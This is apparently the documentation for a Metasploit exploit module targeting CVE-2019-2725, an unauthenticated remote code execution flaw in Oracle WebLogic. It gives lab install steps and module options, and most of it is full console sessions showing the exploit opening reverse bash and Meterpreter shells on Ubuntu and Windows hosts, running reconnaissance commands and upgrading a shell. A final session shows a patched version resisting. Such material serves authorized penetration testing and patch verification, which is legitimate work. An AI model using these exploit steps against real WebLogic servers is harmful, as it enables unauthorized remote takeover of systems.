## Vulnerable Application


CVE-2019-2725 (aka CNVD-C 2019-48814) exploits an XML deserialization vulnerability in Oracle WebLogic via the AsyncResponseService component.  The exploit provides an unauthenticated attacker with remote arbitrary command execution.

Oracle Weblogic runs as a Java-based service in Windows, Linux, and Unix environments.  It is downloadable from Oracle once registered for an account.  For testing vulnerable environments, we used Weblogic 10.3.6 for Ubuntu (`wls1036_linux32.bin`), Weblogic 10.3.6 for Windows (`wls1036_dev.zip`).  For testing a non-vulnerable environment, we used Weblogic 12.2.1.2 (`fmw_12.2.1.2.0_wls.jar`) in combination with a JDK (`jdk-8u211-windows-x64.exe`).

## Verification Steps

#### Install the application
  1. Install the application using the binaries above, with both a WebLogic server and an admin server.
  2. When prompted, name the project `base_domain`.
  3. When prompted, use a development environment instead of a production environment.
  4. When prompted, keep the default port of TCP/7001.
  5. When prompted, provide a username and password, and make a note of them.
  6. Upon completion of the installer, find and execute the admin server.  On Windows: `C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\startWebLogic.cmd`.  On Linux: `~/Oracle/Middleware/user_projects/base_domain/bin/startWebLogic.sh`
  7. You may be prompted for the username and password you generated during the install process.
  8. Wait for the output: `<Server state changed to RUNNING.>`

#### Checking for the vulnerability
  1. Start msfconsole
  2. `use exploit/multi/misc/weblogic_deserialize_asyncresponseservice`
  3. Configure RHOSTS to the target address, and set RPORT if the default port is not being used.
  4. Run the `check` method to confirm exploitability.
  5. Look for one of the following two outputs:
```
msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > check
[+] 192.168.199.191:7001 - The target is vulnerable.
```

```
msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > check
[*] 192.168.199.152:7001 - The target is not exploitable.
```

#### Exploiting the vulnerability
  1. Follow the steps in the previous "checking" section.
  2. Set the operating system of the target (eg. `set TARGET Windows`)
  3. Configure the payload and payload parameters.
  4. `run`

## Options

  **WSPATH**

`WSPATH` points to the `AsyncResponseService` endpoint which is exploited by this module.  A default value has been set and should not need to be changed.

  **URIPATH**
  
`URIPATH` is the URI (eg. `http://192.168.192.132`) used for the HTTP request.  In most cases, this value can be left blank and will be substituted with the IP address from RHOSTS.  Potential uses of this option include if the host is behind network translation or requires a hostname to handle virtual hosts.

## Scenarios

#### Version 10.3.6 on Ubuntu Linux

```
msf5 post(multi/manage/shell_to_meterpreter) > use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > check
[+] 192.168.199.191:7001 - The target is vulnerable.
msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > options

Module options (exploit/multi/misc/weblogic_deserialize_asyncresponseservice):

   Name     Current Setting               Required  Description
   ----     ---------------               --------  -----------
   Proxies                                no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.199.191               yes       The target address range or CIDR identifier
   RPORT    7001                          yes       The target port (TCP)
   SSL      false                         no        Negotiate SSL/TLS for outgoing connections
   URIPATH                                no        URL to the weblogic instance (leave blank to substitute RHOSTS)
   VHOST                                  no        HTTP server virtual host
   WSPATH   /_async/AsyncResponseService  yes       URL to AsyncResponseService


Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.199.148  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix

msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > run

[*] Started reverse TCP handler on 192.168.199.148:4444 
[*] Generating payload...
[*] Sending payload...
[*] Command shell session 1 opened (192.168.199.148:4444 -> 192.168.199.191:43532) at 2019-05-06 12:31:29 -0500

id
uid=1000(administrator) gid=1000(administrator) groups=1000(administrator),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare),116(lxd)
background

Background session 2? [y/N]  y
msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > use post/multi/manage/shell_to_meterpreter
msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 2
msf5 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.199.148:4433 

[*] Sending stage (985320 bytes) to 192.168.199.191
[*] Meterpreter session 2 opened (192.168.199.148:4433 -> 192.168.199.191:55522) at 2019-05-06 12:30:45 -0500

[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > 
msf5 post(multi/manage/shell_to_meterpreter) > 
msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: uid=1000, gid=1000, euid=1000, egid=1000
meterpreter > sysinfo
Computer     : 192.168.199.191
OS           : Ubuntu 16.04 (Linux 4.4.0-146-generic)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > exit
```

#### Version 10.3.6 on Windows 10

```
msf5 > use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set RHOSTS 192.168.199.152
RHOSTS => 192.168.199.152
msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > check
[+] 192.168.199.152:7001 - The target is vulnerable.
msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set LHOST 192.168.199.148 
LHOST => 192.168.199.148
msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set TARGET Windows
TARGET => Windows
msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > options

Module options (exploit/multi/misc/weblogic_deserialize_asyncresponseservice):

   Name     Current Setting               Required  Description
   ----     ---------------               --------  -----------
   Proxies                                no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.199.152               yes       The target address range or CIDR identifier
   RPORT    7001                          yes       The target port (TCP)
   SSL      false                         no        Negotiate SSL/TLS for outgoing connections
   URIPATH                                no        URL to the weblogic instance (leave blank to substitute RHOSTS)
   VHOST                                  no        HTTP server virtual host
   WSPATH   /_async/AsyncResponseService  yes       URL to AsyncResponseService


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.199.148  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows


msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > run

[*] Started reverse TCP handler on 192.168.199.148:4444 
[*] Generating payload...
[*] Sending payload...
[*] Sending stage (179779 bytes) to 192.168.199.152
[*] Meterpreter session 1 opened (192.168.199.148:4444 -> 192.168.199.152:49764) at 2019-05-06 13:46:18 -0500

meterpreter > 
```

#### Version 12.2.1.2 on Windows 10 (non-exploitable)

```
msf5 > use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set RHOSTS 192.168.199.152
RHOSTS => 192.168.199.152
msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set LHOST 192.168.199.148 
LHOST => 192.168.199.148
msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > set TARGET Windows
TARGET => Windows
msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > options

Module options (exploit/multi/misc/weblogic_deserialize_asyncresponseservice):

   Name     Current Setting               Required  Description
   ----     ---------------               --------  -----------
   Proxies                                no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.168.199.152               yes       The target address range or CIDR identifier
   RPORT    7001                          yes       The target port (TCP)
   SSL      false                         no        Negotiate SSL/TLS for outgoing connections
   URIPATH                                no        URL to the weblogic instance (leave blank to substitute RHOSTS)
   VHOST                                  no        HTTP server virtual host
   WSPATH   /_async/AsyncResponseService  yes       URL to AsyncResponseService


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.199.148  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   Windows


msf5 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > run

[*] Started reverse TCP handler on 192.168.199.148:4444 
[*] Generating payload...
[*] Sending payload...
[-] Exploit aborted due to failure: disconnected: The target forcibly closed the connection, and is likely not vulnerable.
[*] Exploit completed, but no session was created.
```
